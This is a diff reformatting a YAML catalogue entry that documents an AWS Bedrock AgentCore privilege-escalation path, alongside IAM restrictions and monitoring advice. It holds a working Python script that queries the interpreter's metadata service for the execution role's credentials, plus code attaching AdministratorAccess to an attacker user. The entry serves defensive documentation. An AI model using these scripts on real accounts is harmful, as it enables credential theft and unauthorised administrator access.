@@ -21,7 +21,31 @@ exploitationSteps:
     command: aws bedrock-agentcore-control get-code-interpreter --code-interpreter-id INTERPRETER_ID
     description: Check the interpreter's execution role ARN to confirm elevated permissions
   - step: 3
-    command: "cat << 'EOF' > \"get_secrets_from_interpreter.py\"\nimport boto3\nimport sys\nbedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])\nCODE_INTERPRETER_ID = sys.argv[1]\n\nsession = bedrock_agentcore_client.start_code_interpreter_session(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n)\nsession_id = session['sessionId']\n\ncode = 'IP=\"169.254.169.254\"; METADATA=\"meta-data\"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'\n\nresponse = bedrock_agentcore_client.invoke_code_interpreter(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n  sessionId=session_id,\n  name='executeCommand',\n  arguments={'command': code}\n)\n\nfor event in response['stream']:\n  if event['result']['structuredContent']['stdout']:\n    print(event['result']['structuredContent']['stdout'])\nEOF\n"
+    command: |
+      cat << 'EOF' > "get_secrets_from_interpreter.py"
+      import boto3
+      import sys
+      bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])
+      CODE_INTERPRETER_ID = sys.argv[1]
+
+      session = bedrock_agentcore_client.start_code_interpreter_session(
+        codeInterpreterIdentifier=CODE_INTERPRETER_ID,
+      )
+      session_id = session['sessionId']
+
+      code = 'IP="169.254.169.254"; METADATA="meta-data"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'
+
+      response = bedrock_agentcore_client.invoke_code_interpreter(
+        codeInterpreterIdentifier=CODE_INTERPRETER_ID,
+        sessionId=session_id,
+        name='executeCommand',
+        arguments={'command': code}
+      )
+
+      for event in response['stream']:
+        if event['result']['structuredContent']['stdout']:
+          print(event['result']['structuredContent']['stdout'])
+      EOF
     description: Create the python file that will invoke the existing interpreter
   - step: 4
     command: 'CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)
@@ -45,7 +69,29 @@ exploitationSteps:
 
       '
     description: Use the stolen credentials to assume the privileged role's permissions
-recommendation: "Restrict the `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter`\npermissions using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\n    \"bedrock-agentcore:StartCodeInterpreterSession\",\n    \"bedrock-agentcore:InvokeCodeInterpreter\"\n  ],\n  \"Resource\": \"arn:aws:bedrock-agentcore:REGION:ACCOUNT_ID:code-interpreter/SpecificInterpreter\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `StartCodeInterpreterSession` and `InvokeCodeInterpreter` events on sensitive code interpreters\n- Alert on session creation for interpreters with administrative roles\n- Implement resource tags and condition keys to restrict code interpreter usage\n- Regularly audit execution roles attached to code interpreters\n- Use SCPs to restrict access to sensitive interpreters\n- Enable CloudTrail Data Event logging for code interpreter invocations\n- Implement network isolation for code interpreters processing sensitive data\n- Review and minimize execution role permissions on existing interpreters\n"
+recommendation: |
+  Restrict the `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter` permissions using resource-based constraints.
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": [
+      "bedrock-agentcore:StartCodeInterpreterSession",
+      "bedrock-agentcore:InvokeCodeInterpreter"
+    ],
+    "Resource": "arn:aws:bedrock-agentcore:REGION:ACCOUNT_ID:code-interpreter/SpecificInterpreter"
+  }
+  ```
+
+  Additional controls:
+  - Monitor CloudTrail for `StartCodeInterpreterSession` and `InvokeCodeInterpreter` events on sensitive code interpreters
+  - Alert on session creation for interpreters with administrative roles
+  - Implement resource tags and condition keys to restrict code interpreter usage
+  - Regularly audit execution roles attached to code interpreters
+  - Use SCPs to restrict access to sensitive interpreters
+  - Enable CloudTrail Data Event logging for code interpreter invocations
+  - Implement network isolation for code interpreters processing sensitive data
+  - Review and minimize execution role permissions on existing interpreters
 limitations: 'This path provides administrative access only if the target resource''s execution role has administrative permissions. The attacker gains whatever permissions the resource''s role has. If the role has limited permissions, the attacker gains limited access. However, even limited access may enable multi-hop attacks or access to sensitive data.
 
   '
@@ -105,12 +151,63 @@ attackVisualization:
     label: 'Method 1: Execute Attack via AWS SDK'
     type: payload
     color: '#99ccff'
-    description: "The malicious code interpreter code uses the AWS SDK within the Python execution environment to directly perform privileged actions using the execution role's credentials. Since the code interpreter automatically runs with the execution role's credentials available through the environment, no credential exfiltration is needed.\n\nExample Python code invoked in the interpreter:\n```python\nimport boto3\n\n# The interpreter automatically has access to the execution role's credentials\niam = boto3.client('iam')\n\n# Attach admin policy to starting user\niam.attach_user_policy(\n    UserName='attacker-user',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n```\n\nThis is the most direct approach - the code interpreter immediately modifies IAM or performs other privileged actions using the execution role's permissions.\n"
+    description: |
+      The malicious code interpreter code uses the AWS SDK within the Python execution environment to directly perform privileged actions using the execution role's credentials. Since the code interpreter automatically runs with the execution role's credentials available through the environment, no credential exfiltration is needed.
+
+      Example Python code invoked in the interpreter:
+      ```python
+      import boto3
+
+      # The interpreter automatically has access to the execution role's credentials
+      iam = boto3.client('iam')
+
+      # Attach admin policy to starting user
+      iam.attach_user_policy(
+          UserName='attacker-user',
+          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+      )
+      ```
+
+      This is the most direct approach - the code interpreter immediately modifies IAM or performs other privileged actions using the execution role's permissions.
   - id: method_cred_exfil
     label: 'Method 2: Exfiltrate Credentials to Output'
     type: payload
     color: '#99ccff'
-    description: "Start a session with the existing code interpreter and invoke Python code to query the MicroVM Metadata Service (MMDS) and retrieve the execution role's temporary credentials. The credentials are returned in the code interpreter's output and can be used from any location.\n\nExample Python script to exfiltrate credentials:\n```python\nimport boto3\nimport sys\n\nbedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])\nCODE_INTERPRETER_ID = sys.argv[1]\n\n# Start a code interpreter session\nsession = bedrock_agentcore_client.start_code_interpreter_session(\n    codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n)\nsession_id = session['sessionId']\n\n# Command to query MMDS for credentials\ncode = 'IP=\"169.254.169.254\"; METADATA=\"meta-data\"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'\n\n# Invoke the code interpreter to execute the command\nresponse = bedrock_agentcore_client.invoke_code_interpreter(\n    codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n    sessionId=session_id,\n    name='executeCommand',\n    arguments={'command': code}\n)\n\n# Extract and print credentials from the output\nfor event in response['stream']:\n    if event['result']['structuredContent']['stdout']:\n        print(event['result']['structuredContent']['stdout'])\n```\n\nThis is similar to exfiltrating credentials from an EC2 instance via IMDS, but targets the MicroVM's metadata service instead. This script retrieves AccessKeyId, SecretAccessKey, and SessionToken from the MMDS and outputs them. The attacker can then export these credentials and use them from any location until they expire.\n"
+    description: |
+      Start a session with the existing code interpreter and invoke Python code to query the MicroVM Metadata Service (MMDS) and retrieve the execution role's temporary credentials. The credentials are returned in the code interpreter's output and can be used from any location.
+
+      Example Python script to exfiltrate credentials:
+      ```python
+      import boto3
+      import sys
+
+      bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])
+      CODE_INTERPRETER_ID = sys.argv[1]
+
+      # Start a code interpreter session
+      session = bedrock_agentcore_client.start_code_interpreter_session(
+          codeInterpreterIdentifier=CODE_INTERPRETER_ID,
+      )
+      session_id = session['sessionId']
+
+      # Command to query MMDS for credentials
+      code = 'IP="169.254.169.254"; METADATA="meta-data"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'
+
+      # Invoke the code interpreter to execute the command
+      response = bedrock_agentcore_client.invoke_code_interpreter(
+          codeInterpreterIdentifier=CODE_INTERPRETER_ID,
+          sessionId=session_id,
+          name='executeCommand',
+          arguments={'command': code}
+      )
+
+      # Extract and print credentials from the output
+      for event in response['stream']:
+          if event['result']['structuredContent']['stdout']:
+              print(event['result']['structuredContent']['stdout'])
+      ```
+
+      This is similar to exfiltrating credentials from an EC2 instance via IMDS, but targets the MicroVM's metadata service instead. This script retrieves AccessKeyId, SecretAccessKey, and SessionToken from the MMDS and outputs them. The attacker can then export these credentials and use them from any location until they expire.
   - id: admin
     label: Effective Administrator
     type: outcome
@@ -135,7 +232,18 @@ attackVisualization:
   - from: start
     to: code_interpreter
     label: Target existing code interpreter
-    description: "Identify an existing code interpreter that has a privileged execution role attached. Use bedrock-agentcore:ListCodeInterpreters to discover available interpreters and bedrock-agentcore:GetCodeInterpreter to check their execution role ARNs.\n\nCommands:\n```bash\n# List existing code interpreters\naws bedrock-agentcore-control list-code-interpreters\n\n# Check execution role of specific interpreter\naws bedrock-agentcore-control get-code-interpreter \\\n  --code-interpreter-id INTERPRETER_ID\n```\n"
+    description: |
+      Identify an existing code interpreter that has a privileged execution role attached. Use bedrock-agentcore:ListCodeInterpreters to discover available interpreters and bedrock-agentcore:GetCodeInterpreter to check their execution role ARNs.
+
+      Commands:
+      ```bash
+      # List existing code interpreters
+      aws bedrock-agentcore-control list-code-interpreters
+
+      # Check execution role of specific interpreter
+      aws bedrock-agentcore-control get-code-interpreter \
+        --code-interpreter-id INTERPRETER_ID
+      ```
   - from: code_interpreter
     to: execution_role
     label: bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter
